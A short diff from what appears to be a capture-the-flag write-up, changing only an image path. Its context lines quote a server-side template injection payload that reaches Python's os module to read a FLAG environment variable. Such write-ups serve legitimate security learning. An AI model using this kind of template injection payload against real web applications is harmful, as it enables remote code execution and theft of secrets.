@@ -48,4 +48,4 @@ then we need to craft a payload to get the FLAG environment variable&#x20;
 
 `{{request.application.`**`globals`**`.`**`builtins`**`.`**`import`**`('os').getenv('FLAG')}}`
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>FLAG</p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>FLAG</p></figcaption></figure>
